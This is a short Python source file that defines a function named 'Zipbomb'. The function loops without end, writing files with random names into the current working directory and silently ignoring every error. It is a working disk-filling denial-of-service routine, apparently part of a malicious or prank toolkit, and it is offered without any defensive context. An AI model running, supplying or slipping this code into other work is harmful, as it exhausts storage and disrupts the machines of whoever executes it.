# Import modules

import os
import random


# Endless creation of files in the selected directory

def Zipbomb():
	while True:
		try:
			Random = str(random.random())
			open(os.getcwd() + '\\' + Random, 'a').write(Random)
		except:
			pass